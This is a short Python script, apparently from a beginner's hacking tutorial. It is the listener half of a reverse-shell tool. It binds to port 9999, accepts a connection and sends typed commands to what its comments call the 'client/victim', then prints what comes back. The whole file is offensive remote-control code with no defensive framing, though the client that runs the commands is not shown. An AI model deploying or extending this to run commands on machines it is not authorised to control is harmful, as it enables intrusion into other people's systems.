# link between two endpoints for network communications
import socket

# imports command line commands into python
import sys

# create a socket (connect two computers)
def create_socket():
    try:
        global host
        global port
        global s
        host = ""
        port = 9999
        s = socket.socket()
    except socket.error as msg:
        print("Socket creation error: " + str(msg))
# binding the socket and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s
        print("binding the port" + str(port))

        s.bind((host, port))
        s.listen(5)

    except socket.error as msg:
        print("socket binding error" + str(msg) + "\n" + "retrying...")
        bind_socket()
# establish connection with a client (socket must be listening)
def socket_accept():
    conn,address = s.accept()
    print("connection has been established.. |" + " IP " + address[0] + " | port " + str(address[1]))
    send_commands(conn)
    conn.close()

# send commands to client/victim
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024), "utf-8")
            print(client_response)

def main():
    create_socket()
    bind_socket()
    socket_accept()

main()